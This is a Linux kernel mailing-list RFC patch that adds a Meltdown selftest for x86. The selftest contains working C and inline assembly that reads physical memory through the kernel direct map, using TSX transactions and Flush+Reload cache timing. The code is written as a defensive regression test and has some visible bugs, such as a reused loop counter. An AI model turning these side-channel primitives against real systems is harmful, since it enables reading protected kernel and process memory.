Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id 91C8E60E16D
	for <lists+linux-kselftest@lfdr.de>; Wed, 26 Oct 2022 15:05:03 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S231628AbiJZNFB (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Wed, 26 Oct 2022 09:05:01 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:54836 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S232823AbiJZNE7 (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Wed, 26 Oct 2022 09:04:59 -0400
Received: from mga14.intel.com (mga14.intel.com [192.55.52.115])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 842AF58EBA;
        Wed, 26 Oct 2022 06:04:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
  t=1666789498; x=1698325498;
  h=date:from:to:cc:subject:message-id:mime-version;
  bh=QE8xGjCWEJbok8d4OdsCu8HxAtS4aa8Rkp+AX0jsVZA=;
  b=S5WZtTvFWM8a/n1q6Kf9hwzSoW3BByBL6OdP7Tw7fcgm7BrmMyVrN5ac
   qJ+gjU5YKw5roQnwYcKz3bZE74ncnldUakXiHRL6xdOmOvpqZhVsqzPME
   Z1h4Mm4G6x8T0ttyaMkib7OVYga0wzKECq+jzeM2y/A/PM2jZIbMXR21b
   1xM3NXPzEMmpdzClMpW3Tqeo9MrUD1XdP7ClfFlGPhR5tV5o/s+a+bFAi
   FUkbe5S2JRrMtJLw+wm70ITJFppuYDrwwWgzcnuLgpAr00esefeyIfP0K
   eeu8UTlguT8Nhrkfl02e3DeSSWuh3MJpYfDgQyxD2dZE4VZz/9BlSLlq6
   A==;
X-IronPort-AV: E=McAfee;i="6500,9779,10512"; a="307932938"
X-IronPort-AV: E=Sophos;i="5.95,214,1661842800"; 
   d="scan'208";a="307932938"
Received: from fmsmga008.fm.intel.com ([10.253.24.58])
  by fmsmga103.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 26 Oct 2022 06:04:58 -0700
X-ExtLoop1: 1
X-IronPort-AV: E=McAfee;i="6500,9779,10512"; a="695355398"
X-IronPort-AV: E=Sophos;i="5.95,214,1661842800"; 
   d="scan'208";a="695355398"
Received: from fmsmsx603.amr.corp.intel.com ([10.18.126.83])
  by fmsmga008.fm.intel.com with ESMTP; 26 Oct 2022 06:04:58 -0700
Received: from fmsmsx603.amr.corp.intel.com (10.18.126.83) by
 fmsmsx603.amr.corp.intel.com (10.18.126.83) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31; Wed, 26 Oct 2022 06:04:57 -0700
Received: from FMSEDG603.ED.cps.intel.com (10.1.192.133) by
 fmsmsx603.amr.corp.intel.com (10.18.126.83) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2375.31 via Frontend Transport; Wed, 26 Oct 2022 06:04:57 -0700
Received: from NAM11-DM6-obe.outbound.protection.outlook.com (104.47.57.172)
 by edgegateway.intel.com (192.55.55.68) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.1.2375.31; Wed, 26 Oct 2022 06:04:57 -0700
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=VKgnJDJ4H4014HVU74upvDu8Zvl5HaDboDoFGnIWlyxnQICu6jKxocK+cuXzPYyDR6GAsLm4tWkOk94mK3V9BYcbiRqTgBib84A/WTto/Z34idZcU+CVry56U8eFPCcMyv/wCHhr+nxYC/BtiMFs5XSn8wHKYyp69GqYl+4LcUwcjuhEb/2WwA7mx9ir4ey3AbuV0yG719+KYnujvwe5tS1cYgXnc2Ez9MLT6ESphd7oqvn9dch6vHEjrx0lBGnIRT7Y+eKUShzIveFsLZXPTvw4N1eDjYssls6kMrMQ5qGOfk/DKqck86brCO9eGL/T+dpScA+WigWuBrJa+BIYwg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=5CmaBb3akqwnt9d7wSd+2775QKIuBzzuquYtA2lQquE=;
 b=FZW4JNez+3Q396FVqvvZRyeSCTA6ZwL6oosTLR6ZzJJIHUinRfRArPP3yMzD0UP7tHxSn3FeGmb+2gvvX5EGBL6Sppdg9QVlfBuTvWStF5AtwtZSACXmJVvO9ga1PAU5RnapmkFVfAWMVuuqndcsWUO7j/19PaqtqDUJEIGGOXgoTxcRzugD+eIDKzdh3MQ6NFiOjAblGJm9UUWn9nxX9gsCkBS6Ytu2gkw7vbJwR3zMG+DhhgGn1CuYywWb0ESsuvfuoDsiQat312D+A7OMVU9teAmRWH7HKWf3Uqy9Sk+UhdldGfgppAvhGvoPhwpN4Um/vkp3tI2YE74GHw1Lww==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
 dkim=pass header.d=intel.com; arc=none
Authentication-Results: dkim=none (message not signed)
 header.d=none;dmarc=none action=none header.from=intel.com;
Received: from BYAPR11MB3062.namprd11.prod.outlook.com (2603:10b6:a03:92::18)
 by PH0PR11MB5048.namprd11.prod.outlook.com (2603:10b6:510:3d::14) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.5746.28; Wed, 26 Oct
 2022 13:04:54 +0000
Received: from BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e]) by BYAPR11MB3062.namprd11.prod.outlook.com
 ([fe80::bb20:85b6:d9ef:423e%6]) with mapi id 15.20.5746.028; Wed, 26 Oct 2022
 13:04:54 +0000
Date:   Wed, 26 Oct 2022 21:04:43 +0800
From:   Aaron Lu <aaron.lu@intel.com>
To:     Dave Hansen <dave.hansen@intel.com>
CC:     Tony Luck <tony.luck@intel.com>,
        "Yin, Fengwei" <fengwei.yin@intel.com>,
        "Kirill A. Shutemov" <kirill.shutemov@linux.intel.com>,
        "Huang, Ying" <ying.huang@intel.com>,
        <linux-kselftest@vger.kernel.org>, <linux-kernel@vger.kernel.org>
Subject: [RFC PATCH] selftest/x86/meltdown: Add a selftest for meltdown
Message-ID: <Y1kwa0ZLI9xbEaHx@ziqianlu-desk1>
Content-Type: text/plain; charset="us-ascii"
Content-Disposition: inline
X-ClientProxiedBy: SG2PR02CA0112.apcprd02.prod.outlook.com
 (2603:1096:4:92::28) To BYAPR11MB3062.namprd11.prod.outlook.com
 (2603:10b6:a03:92::18)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BYAPR11MB3062:EE_|PH0PR11MB5048:EE_
X-MS-Office365-Filtering-Correlation-Id: 8c43a067-8fac-496f-fa2d-08dab752acb8
X-LD-Processed: 46c98d88-e344-4ed4-8496-4ed7712e255d,ExtAddr
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: TSjHZI4C+MAah0IOBNH91AR76hSrDTNDRr0gM3F5uyz1YntocmWDmBaqsjC4TXlaz7HHgwMp3q2GZV4iWc8rEk0IYfSrBfPHqbheMCzKcLiELN98ZilzXkqQBZPqXu2CAtOnFJpYaGHVzhLqPFLq1PI0rDFHa3Oc9Bsp1CxwsMuY8b63XoCUnVmtnv5KmwWaYWQ42yJw6fDCudqh69TW44x6Xfccaw9zgiUBP7VbZKxHS+Yk6Fgz2N1ReNrkaVtGahWl4LMH67EjtON39Ip6caBtjHjWJP54tX9KQicIoCRP+HRhyl+uChZAZ+0Zj601UHoFLXHxQeOTSGPMFU67LJwKilTaR5JOUnZFysns5aCq5yHobGhIOOfUgpaviwsi92oostX7sXejU93CCPpCg15AgzQ6MPXwYXpnCQeKUvJDcZMLcU9gfTGR0CfCp6llB66ujCiFi5A5Hcv0xXr09KLW7tTbJMqVHpPEkCuXAXxleo7ZVkQuxiNB71KO/rfUp4YPal1oOnBBMWMBGKn1SnR6u33hL1fN1ZX58Y0jjHSvL7wp8HK858v5h75BsRVBYIzhEt2R4cYrW8y3DVB9WkSBkSeLyR/Nq+6dNGozlHDYUrXZ5h/x3MNyDURTE/iEW0QgryTG441Y3fIBXl+mNytJr1LZIuA1HMFyfgRR8VnLRzSNaL7uvIODFiLYEZ09uM1Zpau64Kg0/dtjXTywINQuZ5undK+n7H+sU99MLK0=
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:BYAPR11MB3062.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230022)(7916004)(366004)(396003)(39860400002)(346002)(376002)(136003)(451199015)(66899015)(6506007)(316002)(54906003)(26005)(8936002)(4326008)(6512007)(9686003)(66476007)(44832011)(30864003)(86362001)(6636002)(66946007)(66556008)(5660300002)(41300700001)(8676002)(2906002)(6666004)(478600001)(966005)(6486002)(6862004)(83380400001)(33716001)(38100700002)(82960400001)(186003);DIR:OUT;SFP:1102;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?XojDaz/czh+3iVSa/ssXNvKdQWA9K4/elwMiPVObvWJxVAmaUoGLiYkUP0sl?=
 =?us-ascii?Q?SpEBWTtbetNlqZUMMLgHz8ahIjGh3WJSrDJnNMyzAsEXZZwBrpdV8tckaTZo?=
 =?us-ascii?Q?ZXUmelyTZH/xT5vnxHgFNnAx6mXiIrq/2D4qZEewsDaWe9/6Hp36/AURRn7K?=
 =?us-ascii?Q?88B14cLRhpRrMxeONp0DsQqBxR3vTINlrBgIjiFmBEb2rAiL/Yy90jJWKKiu?=
 =?us-ascii?Q?qDQU40OlqZpBzVZ3lehKV2nYg2VgJ/pqTVX7et1qhgT5nzFgiSxaTNX7KrBu?=
 =?us-ascii?Q?dUAo0ihTrFt3UzfDetEAWVfrImoSsnRbornhpBVAiHfryr4Sltv8l5XOTOD5?=
 =?us-ascii?Q?12CBlzhRN0PWmsEzbxo46ij2N5r1Sv2qRf8I75TobUPPaRQHX1Vyp3ErnUwM?=
 =?us-ascii?Q?iSCrXjiwR6EHL1Sy/9Wn3fST7Lh9ko1wNXh1xof9C/vC3rG2oFNX9pU75UKc?=
 =?us-ascii?Q?cS+lBRZf61dKWAJ+iFee+9ibe+0GE/2broDb0g1kgNya8rxniSxjKOh9UU5q?=
 =?us-ascii?Q?5Hvoel4158j+BWNxA7/Ph2+XFpPsriDZlyxda7+3q9O/afYAq3snNYntOqxg?=
 =?us-ascii?Q?jPuG/8aGCq8DdqBe+wjB6gpmwZRyVHlGlRv1jhK93L4OZ9j552TGlToIgBI5?=
 =?us-ascii?Q?tasCxSa3Lrz1J3mUGLifGAldCYwzxEMAyymTWidAZETQZSNNbkTlVcO2Paey?=
 =?us-ascii?Q?V7v704p7eFIihlAtE726T307gHYQen+1bTExqu9DFpGJkmKGJvImAQwuAw+E?=
 =?us-ascii?Q?2RRjOP5OPtmB5U4VCvjgrOgLspU8M9XlcKClR2+PiGR0Yro8+vXMkMLobiVz?=
 =?us-ascii?Q?bG0Hnu35WpLVJsHwYKMiQ0VeLb321HDQ3A5/TDLfUcfx8J8iPIOi6ajve0ca?=
 =?us-ascii?Q?ouFhUxEd+hIy8zHM4Fx+e1UIA3O+NOPm26HsDWknhQxGSjI5h3L0ctx9XzB1?=
 =?us-ascii?Q?n+qff2wynINhRHan/bE7cQAfUx7s4Z8PtNtvHCe08WAPKa5rtsi1QeQQVXPG?=
 =?us-ascii?Q?OvlAtp1psW4ceK1Oi3xHvmG03jDGLFmRh2cVd8gi5Fi1hslktuEB2kqupLb7?=
 =?us-ascii?Q?PtS8L+nfn1OQL9puthYx5QGt8A1cxixNG7EtTsHNEKCZt0EpOQIhMKe8Te2g?=
 =?us-ascii?Q?8PFgoakXb0cxjLfuG2JgUm4KlPpVPucGF5YopvT9n/fXU1sF4JMa2urbRebD?=
 =?us-ascii?Q?p5U5nU6etJ7mlzM/IwcsbFCItMlwIZHj6bJaxM4TV4tZer0ab29JRM2P++Tm?=
 =?us-ascii?Q?+SFAiPzYdh4c4YH77qWE1g38zUKXjpI3yOI9aARNGRpjBc6r/eSZJwgpl3vi?=
 =?us-ascii?Q?gB9EilJrPH6lka8qInEjHI8GkIFruR2I8hSQF3Yc8GCRekgekq01NuL6rUTZ?=
 =?us-ascii?Q?TtcDde0QL5zhWMccTrvTlp7G6Iy6vH8EmOlwjK+iEkT+m91YyJQ7/la5QvyS?=
 =?us-ascii?Q?/A+SX4QaZPESlH28eXVEutPlJLPb75UfbjL+8qAK9ze/Hx5+TdN1gVcoHcV0?=
 =?us-ascii?Q?OdsBfj+WYeXniQadi2LOOqAugWq/ok4RqxRxeBBVEc+2Rnw5t2z8LydHi3nN?=
 =?us-ascii?Q?TUmOO3YT9LQSvmwK1DaB06FXEfCAyY/U3tBTlZiE?=
X-MS-Exchange-CrossTenant-Network-Message-Id: 8c43a067-8fac-496f-fa2d-08dab752acb8
X-MS-Exchange-CrossTenant-AuthSource: BYAPR11MB3062.namprd11.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 26 Oct 2022 13:04:54.1070
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: yAs7NusOvPRayfaoGnO56JdQht+e7K9tPc3rvdV9u/BgLarlrmD/SofIOFBdlZ34Q+ZnhMQjPq1xWyDefTt5bw==
X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR11MB5048
X-OriginatorOrg: intel.com
X-Spam-Status: No, score=-7.6 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_HI,
        SPF_HELO_NONE,SPF_NONE,URIBL_BLOCKED autolearn=ham autolearn_force=no
        version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

To capture potential programming errors like mistakenly setting Global
bit on kernel page table entries, a selftest for meltdown is added.

This selftest is based on https://github.com/IAIK/meltdown. What this
test does is to firstly set a predefined string at a random user address
and then with pagemap, get the physical address of this string. Finally,
try to fetch the data using kernel's directmap address for this physical
address to see if user space can use kernel's page table.

Per my tests, this test works well on CPUs that have TSX support. For
this reason, this selftest only works on CPUs that supports TSX.

This test requires the knowledge of direct map base. IAIK used the
following two methods to get direct map base:
1 through a kernel module to show phys_to_virt(0);
2 by exploiting the same HW vulnerability to guess the base.
Method 1 makes running this selftest complex while method 2 is not
reliable and I do not want to use a possibly wrong value to run this
test. Suggestions are welcome.

Tested on both x86_64 and i386_pae VMs on a host with i7-7700K cpu,
success rate is about 50% when nopti kernel cmdline is used.

Signed-off-by: Aaron Lu <aaron.lu@intel.com>
---
 tools/testing/selftests/x86/Makefile   |   2 +-
 tools/testing/selftests/x86/meltdown.c | 385 +++++++++++++++++++++++++
 2 files changed, 386 insertions(+), 1 deletion(-)
 create mode 100644 tools/testing/selftests/x86/meltdown.c

diff --git a/tools/testing/selftests/x86/Makefile b/tools/testing/selftests/x86/Makefile
index 0388c4d60af0..36f99c360a56 100644
--- a/tools/testing/selftests/x86/Makefile
+++ b/tools/testing/selftests/x86/Makefile
@@ -13,7 +13,7 @@ CAN_BUILD_WITH_NOPIE := $(shell ./check_cc.sh "$(CC)" trivial_program.c -no-pie)
 TARGETS_C_BOTHBITS := single_step_syscall sysret_ss_attrs syscall_nt test_mremap_vdso \
 			check_initial_reg_state sigreturn iopl ioperm \
 			test_vsyscall mov_ss_trap \
-			syscall_arg_fault fsgsbase_restore sigaltstack
+			syscall_arg_fault fsgsbase_restore sigaltstack meltdown
 TARGETS_C_32BIT_ONLY := entry_from_vm86 test_syscall_vdso unwind_vdso \
 			test_FCMOV test_FCOMI test_FISTTP \
 			vdso_restorer
diff --git a/tools/testing/selftests/x86/meltdown.c b/tools/testing/selftests/x86/meltdown.c
new file mode 100644
index 000000000000..fb72d933fd90
--- /dev/null
+++ b/tools/testing/selftests/x86/meltdown.c
@@ -0,0 +1,385 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * This selftest is based on code from https://github.com/IAIK/meltdown
+ * and can be used to check if user space can read data through kernel
+ * page table entries.
+ *
+ * Note for i386 test: due to kernel prefer to use high memory for user
+ * programs, it is necessary to restrict the available memory under that
+ * of low memory size(around ~896MiB) so that the memory hosting "string"
+ * in main() is directly mapped.
+ *
+ * The original copyright and license information are shown below:
+ *
+ * Copyright (c) 2018 meltdown
+ *
+ * This software is provided 'as-is', without any express or implied
+ * warranty. In no event will the authors be held liable for any damages
+ * arising from the use of this software.
+ *
+ * Permission is granted to anyone to use this software for any purpose,
+ * including commercial applications, and to alter it and redistribute it
+ * freely, subject to the following restrictions:
+ *
+ *    1. The origin of this software must not be misrepresented; you must not
+ *    claim that you wrote the original software. If you use this software
+ *    in a product, an acknowledgment in the product documentation would be
+ *    appreciated but is not required.
+ *
+ *    2. Altered source versions must be plainly marked as such, and must not be
+ *    misrepresented as being the original software.
+ *
+ *    3. This notice may not be removed or altered from any source
+ *    distribution.
+ */
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <cpuid.h>
+#include <errno.h>
+#include <err.h>
+#include <sys/mman.h>
+
+#define PAGE_SHIFT	12
+#define PAGE_SIZE	0x1000
+#define PUD_SHIFT	30
+#define PUD_SIZE	(1UL << PUD_SHIFT)
+#define PUD_MASK	(~(PUD_SIZE - 1))
+
+#define _XBEGIN_STARTED	(~0u)
+
+/* configurables */
+#define NR_MEASUREMENTS	3
+#define NR_TRIES	10000
+
+size_t cache_miss_threshold;
+unsigned long directmap_base;
+
+static int get_directmap_base(void)
+{
+	char *buf;
+	FILE *fp;
+	size_t n;
+	int ret;
+
+	fp = fopen("/sys/kernel/debug/page_tables/kernel", "r");
+	if (!fp)
+		return -1;
+
+	buf = NULL;
+	ret = -1;
+	while (getline(&buf, &n, fp) != -1) {
+		if (!strstr(buf, "Kernel Mapping"))
+			continue;
+
+		if (getline(&buf, &n, fp) != -1 &&
+		    sscanf(buf, "0x%lx", &directmap_base) == 1) {
+			printf("directmap_base=0x%lx/0x%lx\n", directmap_base, directmap_base & PUD_MASK);
+			directmap_base &= PUD_MASK;
+			ret = 0;
+			break;
+		}
+	}
+
+	fclose(fp);
+	free(buf);
+	return ret;
+}
+
+/*
+ * Requires root due to pagemap.
+ */
+static int virt_to_phys(unsigned long virt, unsigned long *phys)
+{
+	unsigned long pfn;
+	uint64_t val;
+	int fd, ret;
+
+	fd = open("/proc/self/pagemap", O_RDONLY);
+	if (fd == -1) {
+		printf("Failed to open pagemap\n");
+		return -1;
+	}
+
+	ret = pread(fd, &val, sizeof(val), (virt >> PAGE_SHIFT) * sizeof(uint64_t));
+	if (ret == -1) {
+		printf("Failed to read pagemap\n");
+		goto out;
+	}
+
+	if (!(val & (1ULL << 63))) {
+		printf("Page not present according to pagemap\n");
+		ret = -1;
+		goto out;
+	}
+
+	pfn = val & ((1ULL << 55) - 1);
+	if (pfn == 0) {
+		printf("Need CAP_SYS_ADMIN to show pfn\n");
+		ret = -1;
+		goto out;
+	}
+
+	ret = 0;
+	*phys = (pfn << PAGE_SHIFT) | (virt & (PAGE_SIZE - 1));
+
+out:
+	close(fd);
+	return ret;
+}
+
+static uint64_t rdtsc()
+{
+	uint64_t a = 0, d = 0;
+
+	asm volatile("mfence");
+#ifdef __x86_64__
+	asm volatile("rdtsc" : "=a"(a), "=d"(d));
+#else
+	asm volatile("rdtsc" : "=A"(a));
+#endif
+	a = (d << 32) | a;
+	asm volatile("mfence");
+
+	return a;
+}
+
+#ifdef __x86_64__
+static void maccess(void *p)
+{
+	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%rcx), %%rax\n"		\
+		     "shl $12, %%rax\n"			\
+		     "jz 1b\n"				\
+		     "movq (%%rbx,%%rax,1), %%rbx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "rax");
+#else
+static void maccess(void *p)
+{
+	asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
+}
+
+static void flush(void *p)
+{
+	asm volatile("clflush 0(%0)\n" : : "c"(p) : "eax");
+}
+
+#define MELTDOWN					\
+	asm volatile("1:\n"				\
+		     "movzx (%%ecx), %%eax\n"		\
+		     "shl $12, %%eax\n"			\
+		     "jz 1b\n"				\
+		     "mov (%%ebx,%%eax,1), %%ebx\n"	\
+		     :					\
+		     : "c"(virt), "b"(array)		\
+		     : "eax");
+#endif
+
+static void detect_flush_reload_threshold()
+{
+	size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
+	size_t dummy[16];
+	size_t *ptr = dummy + 8;
+	uint64_t start = 0, end = 0;
+
+	maccess(ptr);
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		reload_time += (end - start);
+	}
+
+	for (i = 0; i < count; i++) {
+		start = rdtsc();
+		maccess(ptr);
+		end = rdtsc();
+		flush(ptr);
+		flush_reload_time += (end - start);
+	}
+
+	reload_time /= count;
+	flush_reload_time /= count;
+
+	printf("Flush+Reload: %zd cycles, Reload only: %zd cycles\n",
+			flush_reload_time, reload_time);
+	cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
+	printf("Flush+Reload threshold: %zd cycles\n", cache_miss_threshold);
+}
+
+static int flush_reload(void *ptr)
+{
+	uint64_t start, end;
+
+	start = rdtsc();
+	maccess(ptr);
+	end = rdtsc();
+
+	flush(ptr);
+
+	if (end - start < cache_miss_threshold)
+		return 1;
+
+	return 0;
+}
+
+static int check_tsx()
+{
+	if (__get_cpuid_max(0, NULL) >= 7) {
+		unsigned a, b, c, d;
+		__cpuid_count(7, 0, a, b, c, d);
+		return (b & (1 << 11)) ? 1 : 0;
+	} else
+		return 0;
+}
+
+static unsigned int xbegin(void)
+{
+	unsigned int status;
+
+	asm volatile("xbegin 1f \n 1:" : "=a"(status) : "a"(-1UL) : "memory");
+	asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
+
+	return status;
+}
+
+static void xend(void)
+{
+	asm volatile("xend" ::: "memory");
+	asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
+}
+
+static int __read_phys_memory_tsx(unsigned long phys, char *array)
+{
+	unsigned long virt;
+	int i, retries;
+
+	virt = phys + directmap_base;
+	for (retries = 0; retries < NR_TRIES; retries++) {
+		if (xbegin() == _XBEGIN_STARTED) {
+			MELTDOWN;
+			xend();
+		}
+
+		for (i = 1; i < 256; i++) {
+			if (flush_reload(array + i * PAGE_SIZE))
+				return i;
+		}
+	}
+
+	return 0;
+}
+
+/*
+ * Read physical memory by exploiting HW bugs.
+ * One byte a time.
+ */
+static int read_phys_memory(unsigned long phys, char *array)
+{
+	char res_stat[256];
+	int i, r, max_v, max_i;
+
+	memset(res_stat, 0, sizeof(res_stat));
+
+	for (i = 0; i < NR_MEASUREMENTS; i++) {
+		for (i = 0; i < 256; i++)
+			flush(array + i * PAGE_SIZE);
+
+		r = __read_phys_memory_tsx(phys, array);
+		if (r != 0)
+			res_stat[r]++;
+	}
+
+	max_v = 0;
+	for (i = 1; i < 256; i++) {
+		if (res_stat[i] > max_v) {
+			max_i = i;
+			max_v = res_stat[i];
+		}
+	}
+
+	if (max_v == 0)
+		return 0;
+
+	return max_i;
+}
+
+static int test_meltdown(void)
+{
+	char string[] = "test string";
+	char *array, *result;
+	unsigned long phys;
+	int i, len, ret;
+
+	if (get_directmap_base() == -1) {
+		printf("[FAIL]\tFailed to get directmap base. Make sure you are root and kernel has CONFIG_PTDUMP_DEBUGFS\n");
+		return 0;
+	}
+
+	detect_flush_reload_threshold();
+
+	if (!check_tsx()) {
+		printf("[FAIL]\tNo TSX support\n");
+		return 0;
+	}
+
+	if (virt_to_phys((unsigned long)string, &phys) == -1) {
+		printf("[FAIL]\tFailed to convert virtual address to physical address\n");
+		return -1;
+	}
+
+	len = strlen(string);
+	result = malloc(len + 1);
+	if (!result) {
+		printf("[FAIL]\tNot enough memory for malloc\n");
+		return -1;
+	}
+	memset(result, 0, len + 1);
+
+	array = mmap(NULL, 256 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (!array) {
+		printf("[FAIL]\tNot enough memory for mmap\n");
+		free(result);
+		return -1;
+	}
+	memset(array, 0, 256 * PAGE_SIZE);
+
+	for (i = 0; i < len; i++, phys++) {
+		result[i] = read_phys_memory(phys, array);
+		if (result[i] == 0)
+			break;
+	}
+
+	ret = !strncmp(string, result, len);
+	if (ret)
+		printf("[FAIL]\tSystem is vulnerable to meltdown.\n");
+	else
+		printf("[OK]\tSystem might not be vulnerable to meltdown.\n");
+
+	munmap(array, 256 * PAGE_SIZE);
+	free(result);
+
+	return ret;
+}
+
+int main(void)
+{
+	printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+
+	return test_meltdown();
+}
-- 
2.30.2

